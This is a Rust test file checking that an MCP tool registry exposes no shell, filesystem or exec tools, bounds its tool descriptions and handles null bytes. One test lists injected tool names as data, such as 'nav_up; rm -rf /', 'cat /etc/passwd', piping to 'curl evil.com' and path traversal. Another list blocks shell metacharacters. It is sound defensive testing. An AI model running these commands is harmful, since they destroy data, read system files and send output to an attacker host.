use crate::mcp::pane_state::PaneFileEntry;
use crate::mcp::protocol::McpRequest;
use crate::mcp::tools::get_all_tools;

// =============================================================================
// Security-focused tests
// =============================================================================

#[test]
fn test_tool_names_no_shell_injection() {
    let tools = get_all_tools();
    let dangerous_chars = [
        '|', '&', ';', '$', '`', '(', ')', '{', '}', '[', ']', '<', '>', '!', '\n', '\r',
    ];

    for tool in tools {
        for c in dangerous_chars {
            assert!(
                !tool.name.contains(c),
                "Tool name {} contains dangerous char: {}",
                tool.name,
                c
            );
        }
    }
}

#[test]
fn test_no_fs_tools_exist() {
    // Security: We removed fs.* tools to prevent file system access
    let tools = get_all_tools();
    let fs_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("fs.")).collect();
    assert!(
        fs_tools.is_empty(),
        "fs.* tools should not exist (security): {:?}",
        fs_tools.iter().map(|t| &t.name).collect::<Vec<_>>()
    );
}

#[test]
fn test_no_shell_tools_exist() {
    // Security: We removed shell.* tools to prevent command execution
    let tools = get_all_tools();
    let shell_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("shell.")).collect();
    assert!(
        shell_tools.is_empty(),
        "shell.* tools should not exist (security): {:?}",
        shell_tools.iter().map(|t| &t.name).collect::<Vec<_>>()
    );
}

#[test]
fn test_no_exec_tools_exist() {
    // Security: We should not have any exec/run tools
    let tools = get_all_tools();
    let dangerous_patterns = ["exec.", "run.", "execute.", "command.", "spawn.", "process."];

    for tool in tools {
        for pattern in dangerous_patterns {
            assert!(
                !tool.name.starts_with(pattern),
                "Dangerous tool pattern detected: {}",
                tool.name
            );
        }
    }
}

/// A description is PREFIX: every declaration rides every turn of every conversation,
/// whether or not the turn calls that tool. The cap is a coarse backstop against a
/// description that grew into documentation; the precise budget guard is
/// `agent/chat/context/cost_tests.rs`, which measures the whole prefix against
/// `FIXED_PROMPT_OVERHEAD_TOKENS`.
///
/// Most entries sit far below the cap, and the handful that approach it were trimmed to
/// stay under. The one that legitimately runs longer is `search`, a ROUTING description:
/// it draws the line against `list_dir` (a whole drive versus one folder's children) and
/// says what a name search cannot answer. Getting that wrong costs a whole wrong tool
/// call, which is worth more than the bytes. `inspect_file` runs longer still, for the
/// same reason, in the agent view this test doesn't reach.
const MAX_TOOL_DESCRIPTION_CHARS: usize = 512;

#[test]
fn test_tools_have_bounded_descriptions() {
    let tools = get_all_tools();
    for tool in tools {
        assert!(
            tool.description.len() <= MAX_TOOL_DESCRIPTION_CHARS,
            "Tool {} has description too long ({} chars, cap {MAX_TOOL_DESCRIPTION_CHARS}). \
             A declaration is prefix, paid every turn: say it in the description only when the \
             model would otherwise call the wrong tool, and put the rest in the result or the \
             system prompt.",
            tool.name,
            tool.description.len()
        );
    }
}

// =============================================================================
// Input injection tests
// =============================================================================

#[test]
fn test_malicious_tool_name_injection() {
    // These are tool names that an attacker might try
    let malicious_names = [
        "nav_up; rm -rf /",
        "nav_up && cat /etc/passwd",
        "nav_up | curl evil.com",
        "../../../etc/passwd",
        "nav_up\nrm -rf /",
        "nav_up\x00hidden",
    ];

    let tools = get_all_tools();
    for name in malicious_names {
        assert!(
            !tools.iter().any(|t| t.name == name),
            "Dangerous tool name should not exist: {}",
            name
        );
    }
}

#[test]
fn test_request_with_very_long_method() {
    // A request with an extremely long method name should still parse
    let long_method = "a".repeat(10000);
    let json = format!(r#"{{"jsonrpc": "2.0", "id": 1, "method": "{}"}}"#, long_method);

    let result: Result<McpRequest, _> = serde_json::from_str(&json);
    if let Ok(req) = result {
        // It parsed, but the method should not match any tool
        let tools = get_all_tools();
        assert!(!tools.iter().any(|t| t.name == req.method));
    }
}

#[test]
fn test_null_bytes_in_paths() {
    // Null bytes in paths could cause issues
    let entry = PaneFileEntry {
        name: "file\x00hidden.txt".to_string(),
        path: "/path/file\x00hidden.txt".to_string(),
        is_directory: false,
        size: None,
        recursive_size: None,
        modified: None,
        recursive_size_pending: None,
        tags: vec![],
        ..Default::default()
    };

    // Should serialize without panic
    let json = serde_json::to_value(&entry).unwrap();
    // The null byte is preserved in JSON
    assert!(json["name"].as_str().unwrap().contains('\x00'));
}
